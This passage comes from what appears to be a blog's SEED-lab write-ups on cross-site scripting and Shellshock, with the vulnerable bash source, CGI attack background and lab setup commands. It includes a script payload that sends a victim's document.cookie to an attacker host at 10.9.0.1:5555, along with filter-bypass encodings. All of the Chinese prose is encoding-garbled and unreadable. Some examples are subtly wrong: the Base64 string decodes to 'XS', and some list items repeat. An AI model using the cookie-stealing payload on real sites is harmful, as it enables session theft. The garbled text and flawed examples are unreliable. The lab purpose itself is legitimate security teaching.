class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨myscripts.jsä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;æ¶æ„ä»£ç å·²æ‰§è¡Œï¼&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·è®¿é—®åŒ…å«ä¸Šè¿°ä»£ç çš„ç½‘é¡µæ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†</p><p>å¦‚æœæ”»å‡»è€…å¸Œæœ›é€šè¿‡ JavaScript ä»£ç å°† cookie å‘é€ç»™è‡ªå·±ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ jsä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å½“ JavaScript æ’å…¥ img æ ‡è®°æ—¶ï¼Œæµè§ˆå™¨å°è¯•ä» src å­—æ®µä¸­çš„ URL åŠ è½½å›¾åƒ; è¿™å¯¼è‡´å‘æ”»å‡»è€…çš„æœºå™¨å‘é€ HTTP GET è¯·æ±‚</p><h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h2><p>XSSæ”»å‡»å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ol><li>å­˜å‚¨å‹XSSæ”»å‡»ï¼Œåˆç§°æŒä¹…å‹XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬ä»£ç å­˜å‚¨åœ¨Webåº”ç”¨ç¨‹åºçš„æ•°æ®åº“ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®åŒ…å«è¯¥æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚</li><li>åå°„å‹XSSæ”»å‡»ï¼Œåˆç§°éæŒä¹…å‹XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬ä»£ç ä½œä¸ºå‚æ•°å‘é€ç»™Webåº”ç”¨ç¨‹åºï¼ŒWebåº”ç”¨ç¨‹åºå°†è¯¥å‚æ•°åå°„å›ç»™ç”¨æˆ·ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li>DOMå‹XSSæ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡ä¿®æ”¹ç½‘é¡µçš„DOMç»“æ„ï¼Œå°†æ¶æ„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚</li></ol><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol><li>HTMLç¼–ç ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒHTMLç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</li><li>JavaScriptç¼–ç ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒJavaScriptç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</li><li>DOMå‹XSSæ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡ä¿®æ”¹ç½‘é¡µçš„DOMç»“æ„ï¼Œå°†æ¶æ„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚</li></ol><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ol><li>Unicodeç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒUnicodeç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>ã€‚</li><li>Base64ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒBase64ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>ã€‚</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>ã€‚</li><li>åŒé‡ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒåŒé‡HTMLç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>ã€‚</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>ã€‚</li></ol><h2 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h2><ul><li>ä½¿ç”¨HTTPOnly Cookieã€‚HTTPOnly Cookieåªèƒ½é€šè¿‡HTTPåè®®ä¼ è¾“ï¼Œæ— æ³•é€šè¿‡JavaScriptç­‰è„šæœ¬è¯­è¨€è®¿é—®ï¼Œä»è€Œé˜²æ­¢æ¶æ„è„šæœ¬ä»£ç è®¿é—®Cookieã€‚è¿™æ ·ï¼Œå³ä½¿æ¶æ„è„šæœ¬ä»£ç èƒ½å¤Ÿæ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä¹Ÿæ— æ³•çªƒå–ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯</li></ul>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šshellshock</title>
    <link href="/p/9eb48b8c/"/>
    <url>/p/9eb48b8c/</url>
    
    <content type="html"><![CDATA[<h1 id="shellshockåŸç†"><a href="#shellshockåŸç†" class="headerlink" title="shellshockåŸç†"></a>shellshockåŸç†</h1><p>shellshockè¢«è®°å½•åœ¨CVE-2014-6271ï¼Œå…·æœ‰ 9.8 CRITICALçš„å¨èƒè¯„åˆ†ï¼Œäº2014å¹´9æœˆ24æ—¥å…¬å¼€å‘å¸ƒ</p><p>ç®€å•æ¥è¯´ï¼Œå½“çˆ¶è¿›ç¨‹forkå‡ºå­è¿›ç¨‹çš„æ—¶å€™ï¼Œå­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œä½†æ˜¯ç”±äºbashé”™è¯¯çš„å¤„ç†æœºåˆ¶ï¼Œå¯¼è‡´ç¯å¢ƒå˜é‡è¢«è§£é‡Šæˆäº†å‡½æ•°ï¼Œå¯åŠ¨Bashçš„æ—¶å€™ï¼Œå®ƒä¸ä½†ä¼šå¯¼å…¥è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿä¼šæŠŠå‡½æ•°å®šä¹‰åé¢çš„å‘½ä»¤æ‰§è¡Œ</p><p>ä¸‹é¢ç”¨ä»£ç æ¥æ¼”ç¤ºä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">[04/14/2021 00:28] seed@ubuntu:~$ foo=&#x27;() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;;&#x27; # fooæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²<br>[04/14/2021 00:29] seed@ubuntu:~$ echo $foo<br>() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;; #æ‰“å°å‡ºå­—ç¬¦ä¸²fooçš„å†…å®¹<br>[04/14/2021 00:29] seed@ubuntu:~$ export foo #å°†fooä½œä¸ºç¯å¢ƒå˜é‡å¯¼å‡º<br>[04/14/2021 00:29] seed@ubuntu:~$ bash #å¼€ä¸€ä¸ªå­è¿›ç¨‹<br>8848 #è¿™é‡Œè‡ªåŠ¨è¿è¡Œäº†echo 8848å‘½ä»¤<br>[04/14/2021 00:29] seed@ubuntu:~$ declare -f foo<br>foo () <br>&#123; <br>    echo &quot;wdnmd&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±ä¸Šå¯ä»¥å‘ç°ï¼Œfooæœ¬æ¥æ˜¯ä¸€ä¸ªshellå˜é‡ï¼Œä½†æ˜¯åœ¨export fooä½¿å…¶æˆä¸ºç¯å¢ƒå˜é‡åï¼Œåœ¨å­shellè¿›ç¨‹ä¸­ï¼Œfooæˆä¸ºäº†ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å‘½ä»¤è¡Œè‡ªåŠ¨æ‰§è¡Œäº†echo â€œ8848â€çš„å‘½ä»¤</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">foo=&#x27;<span class="hljs-params">()</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wdnmd&quot;</span>; &#125; ;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;8848&quot;</span>;&#x27;<br>foo  <span class="hljs-params">()</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wdnmd&quot;</span>; &#125; ;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;8848&quot;</span>;<br></code></pre></td></tr></table></figure><p>shellshockçš„å‡ºç°æ˜¯bashæºç ä¸­variable.cæ–‡ä»¶çš„bugå¯¼è‡´çš„,å­è¿›ç¨‹åœ¨ä¼ é€’çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡çš„æ—¶å€™ï¼ŒåŒ¹é…åˆ°() {è¿™å››ä¸ªå­—ç¬¦ï¼Œâ€˜=â€™ä¼šè¢«ç©ºæ ¼æ›¿ä»£ï¼Œå› æ­¤å°±ä¼šå°†å…¶è§£é‡Šä¸ºå‡½æ•°</p><p>å¦‚æœå­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå‡½æ•°å®šä¹‰ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°å°†åªè§£æå®ƒï¼Œè€Œä¸æ‰§è¡Œå®ƒã€‚å¦‚æœå­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª shell å‘½ä»¤ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°å°†æ‰§è¡Œå®ƒï¼›å€˜è‹¥è¯¥ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²åŒ…å«å¤šä¸ªç”¨åˆ†å·ï¼›éš”å¼€çš„shellå‘½ä»¤ï¼Œparse_and_executeå‡½æ•°ä¼šæ‰§è¡Œæ¯ä¸€æ¡å‘½ä»¤</p><p><img src="/image/seed/20210415142147.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">initialize_shell_variables (env, privmode)<br>     <span class="hljs-keyword">char</span> **env;<br>     <span class="hljs-keyword">int</span> privmode;<br>&#123;<br>  <span class="hljs-keyword">char</span> *name, *<span class="hljs-built_in">string</span>, *temp_string;<br>  <span class="hljs-keyword">int</span> c, char_index, string_index, string_length;<br>  SHELL_VAR *temp_var;<br><br>  create_variable_tables ();<br><br>  <span class="hljs-keyword">for</span> (string_index = <span class="hljs-number">0</span>; <span class="hljs-built_in">string</span> = env[string_index++]; )<br>    &#123;<br><br>      char_index = <span class="hljs-number">0</span>;<br>      name = <span class="hljs-built_in">string</span>;<br>      <span class="hljs-keyword">while</span> ((c = *<span class="hljs-built_in">string</span>++) &amp;&amp; c != <span class="hljs-string">&#x27;=&#x27;</span>)<br>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>[<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>char_index = <span class="hljs-built_in">string</span> - name - <span class="hljs-number">1</span>;<br><br>      <span class="hljs-comment">/* If there are weird things in the environment, like `=xxx&#x27; or a</span><br><span class="hljs-comment"> string without an `=&#x27;, just skip them. */</span><br>      <span class="hljs-keyword">if</span> (char_index == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* ASSERT(name[char_index] == &#x27;=&#x27;) */</span><br>      name[char_index] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-comment">/* Now, name = env variable name, string = env variable value, and</span><br><span class="hljs-comment"> char_index == strlen (name) */</span><br><br>      temp_var = (SHELL_VAR *)<span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-comment">/* If exported function, define it now.  Don&#x27;t import functions from</span><br><span class="hljs-comment"> the environment in privileged mode. */</span><br>      <span class="hljs-keyword">if</span> (privmode == <span class="hljs-number">0</span> &amp;&amp; read_but_dont_execute == <span class="hljs-number">0</span> &amp;&amp; STREQN (<span class="hljs-string">&quot;() &#123;&quot;</span>, <span class="hljs-built_in">string</span>, <span class="hljs-number">4</span>))<br>&#123;<br>  string_length = <span class="hljs-built_in">strlen</span> (<span class="hljs-built_in">string</span>);<br>  temp_string = (<span class="hljs-keyword">char</span> *)xmalloc (<span class="hljs-number">3</span> + string_length + char_index);<br><br>  <span class="hljs-built_in">strcpy</span> (temp_string, name);<br>  temp_string[char_index] = <span class="hljs-string">&#x27; &#x27;</span>;<br>  <span class="hljs-built_in">strcpy</span> (temp_string + char_index + <span class="hljs-number">1</span>, <span class="hljs-built_in">string</span>);<br><br>  parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);<br><br>  <span class="hljs-comment">/* Ancient backwards compatibility.  Old versions of bash exported</span><br><span class="hljs-comment">     functions like name()=() &#123;...&#125; */</span><br>  <span class="hljs-keyword">if</span> (name[char_index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; name[char_index - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;(&#x27;</span>)<br>    name[char_index - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>  <span class="hljs-keyword">if</span> (temp_var = find_function (name))<br>    &#123;<br>      VSETATTR (temp_var, (att_exported|att_imported));<br>      array_needs_making = <span class="hljs-number">1</span>;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    report_error (_(<span class="hljs-string">&quot;error importing function definition for `%s&#x27;&quot;</span>), name);<br><br>  <span class="hljs-comment">/* ( */</span><br>  <span class="hljs-keyword">if</span> (name[char_index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; name[char_index - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    name[char_index - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;(&#x27;</span>;<span class="hljs-comment">/* ) */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="shellshockæ”»å‡»CGIç¨‹åºå¦‚ä½•å¯èƒ½"><a href="#shellshockæ”»å‡»CGIç¨‹åºå¦‚ä½•å¯èƒ½" class="headerlink" title="shellshockæ”»å‡»CGIç¨‹åºå¦‚ä½•å¯èƒ½"></a>shellshockæ”»å‡»CGIç¨‹åºå¦‚ä½•å¯èƒ½</h2><p>è®¸å¤š Web æœåŠ¡å™¨æ”¯æŒ CGIï¼Œè¿™æ˜¯ä¸€ç§ç”¨äºåœ¨ Web é¡µé¢å’Œ Web åº”ç”¨ç¨‹åºä¸Šç”ŸæˆåŠ¨æ€å†…å®¹çš„æ ‡å‡†æ–¹æ³•ã€‚</p><p>è®¸å¤š CGI ç¨‹åºéƒ½æ˜¯ shell è„šæœ¬ï¼Œå› æ­¤åœ¨å®é™…çš„ CGI ç¨‹åºè¿è¡Œä¹‹å‰ï¼Œå°†é¦–å…ˆè°ƒç”¨ä¸€ä¸ª shell ç¨‹åºï¼Œè¿™æ ·çš„è°ƒç”¨ç”±è¿œç¨‹è®¡ç®—æœºä¸Šçš„ç”¨æˆ·è§¦å‘ã€‚å¦‚æœ shell ç¨‹åºæ˜¯æ˜“å—æ”»å‡»çš„ bash ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ˜“å—æ”»å‡»çš„ Shellshock æ¥è·å¾—æœåŠ¡å™¨ä¸Šçš„ç‰¹æƒ</p><p>å½“ç”¨æˆ·å°†CGI URLå‘é€åˆ°Apache WebæœåŠ¡å™¨æ—¶ï¼ŒApacheå°†æ£€æŸ¥è¯¥è¯·æ±‚ï¼Œå¦‚æœæ˜¯CGIè¯·æ±‚ï¼ŒApacheå°†ä½¿ç”¨fork()å¯åŠ¨æ–°è¿›ç¨‹ï¼Œç„¶åä½¿ç”¨exec())å‡½æ•°æ‰§è¡ŒCGIç¨‹åº</p><p>Shellshockçš„åŸç†æ˜¯åˆ©ç”¨äº†Bashåœ¨å¯¼å…¥ç¯å¢ƒå˜é‡å‡½æ•°æ—¶å€™çš„æ¼æ´ï¼Œå¯åŠ¨Bashçš„æ—¶å€™ï¼Œå®ƒä¸ä½†ä¼šå¯¼å…¥è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿä¼šæŠŠå‡½æ•°å®šä¹‰åé¢çš„å‘½ä»¤æ‰§è¡Œã€‚åœ¨æœ‰äº›CGIè„šæœ¬çš„è®¾è®¡ä¸­ï¼Œæ•°æ®æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡æ¥ä¼ é€’çš„ï¼Œè¿™æ ·å°±ç»™äº†æ•°æ®æä¾›è€…åˆ©ç”¨Shellshockæ¼æ´çš„æœºä¼š</p><p><img src="/image/seed/20210415142148.png"></p><h2 id="shellshockå±å®³"><a href="#shellshockå±å®³" class="headerlink" title="shellshockå±å®³"></a>shellshockå±å®³</h2><ul><li><p>æ‹’ç»æœåŠ¡æ”»å‡»</p><ul><li>æ³¨å…¥è¯¸å¦‚/bin/sleep 20çš„è¯­å¥è®©æœåŠ¡å™¨ç¡çœ </li></ul></li><li><p>è¿œç¨‹ä»£ç æ‰§è¡Œ</p><ul><li>æœ¬è´¨ä¸Šæ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»</li></ul></li><li><p>å½±å“èŒƒå›´</p><ul><li>è¿è¡ŒCGIè„šæœ¬çš„Apache HTTP æœåŠ¡å™¨â€¢ </li><li>ä½¿ç”¨CGIä½œä¸ºç½‘ç»œæ¥å£çš„åŸºäºLinuxçš„è·¯ç”±å™¨</li><li> ä½¿ç”¨Bashçš„å„ç§ç½‘ç»œæœåŠ¡</li><li> SSHã€DHCPç­‰</li></ul></li></ul><h1 id="seedlabç¯å¢ƒé…ç½®"><a href="#seedlabç¯å¢ƒé…ç½®" class="headerlink" title="seedlabç¯å¢ƒé…ç½®"></a>seedlabç¯å¢ƒé…ç½®</h1><ul><li>è®¾ç½®ipåŸŸåæ˜ å°„<ul><li>åœ¨æ–‡ä»¶/etc/hosts/ä¸­è¿½åŠ ï¼š<code>10.9.0.80 www.seedlab-shellshock.com</code></li><li>å…¶ä¸­ï¼Œ10.9.0.80æ˜¯webæœåŠ¡å™¨å®¹å™¨çš„ipåœ°å€</li></ul></li><li>ä¸‹è½½å®éªŒææ–™<ul><li><code>curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip </code></li></ul></li><li>è¿è¡Œå®¹å™¨<ul><li>åœ¨docker-composeç›®å½•è¿è¡Œ<code>docker-compose build</code>å’Œ<code>docker-compose up</code>å‘½ä»¤ï¼Œåˆ†åˆ«å¯¹åº”å®¹å™¨é•œåƒçš„ç”Ÿæˆå’Œå®¹å™¨çš„è¿è¡Œ</li></ul></li></ul><p>seedæä¾›çš„è™šæ‹Ÿæœºé»˜è®¤è®¾ç½®äº†aliasï¼Œæ¯”å¦‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br>$ dockps <span class="hljs-regexp">//</span> Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;id&gt; <span class="hljs-regexp">//</span> Alias <span class="hljs-keyword">for</span>: docker exec -it &lt;id&gt; <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡docksh <id>è¿›å…¥å®¹å™¨å†…å¹¶è¿è¡Œå‘½ä»¤è¡Œ</p><p>ä¸‹è½½labæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip<br>````<br><br>è§£å‹<br><br>```shell<br>unzip Labsetup.zip<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªlabä¸­ï¼Œæˆ‘ä»¬å°†å¯¹ Web æœåŠ¡å™¨å®¹å™¨å‘èµ·ä¸€æ¬¡ Shellshock æ”»å‡»</p><h1 id="Passing-Data-to-Bash-via-Environment-Variable"><a href="#Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Passing Data to Bash via Environment Variable"></a>Passing Data to Bash via Environment Variable</h1><p>ä¸ºäº†åœ¨åŸºäº bash çš„ CGI ç¨‹åºä¸­åˆ©ç”¨ shellshockæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦å°†ä»–ä»¬çš„æ•°æ®ä¼ é€’ç»™æ˜“å—æ”»å‡»çš„ bash ç¨‹åºï¼Œå¹¶ä¸”æ•°æ®éœ€è¦é€šè¿‡ä¸€ä¸ªç¯å¢ƒå˜é‡ä¼ é€’</p><p>ä½¿ç”¨curl å‘½ä»¤è¡Œå·¥å…·å¯ä»¥å…è®¸ç”¨æˆ·æ§åˆ¶ HTTP è¯·æ±‚ä¸­çš„å¤§å¤šæ•°å­—æ®µ</p><ul><li>-v å­—æ®µå¯ä»¥æ‰“å°å‡º HTTP è¯·æ±‚çš„å¤´éƒ¨</li><li>-Aï¼šè®¾ç½®User-Agent</li><li>-eï¼šè®¾ç½®Referer</li><li>-Hï¼šæ·»åŠ è‡ªå®šä¹‰çš„ HTTP è¯·æ±‚å¤´<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br></code></pre></td></tr></table></figure></li></ul><p>ä½¿ç”¨HTTP Header Live æ‰©å±•æ¥æ•è· HTTP è¯·æ±‚ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°ç¯å¢ƒå˜é‡</p><p>å¦‚æœå‘½ä»¤æœ‰ä¸€ä¸ªçº¯æ–‡æœ¬è¾“å‡ºï¼Œå¹¶ä¸”å¸Œæœ›å¾—åˆ°è¾“å‡ºçš„è¿”å›ï¼Œé‚£ä¹ˆè¾“å‡ºéœ€è¦éµå¾ªä¸€ä¸ªåè®®: å®ƒåº”è¯¥ä»¥ Content type: text/print å¼€å§‹ï¼Œåé¢è·Ÿä¸€ä¸ªç©ºè¡Œï¼Œç„¶åå¯ä»¥æ”¾ç½®çº¯æ–‡æœ¬è¾“å‡º</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> Content_type: text/plain; <span class="hljs-keyword">echo</span>; <span class="hljs-string">/bin/ls</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 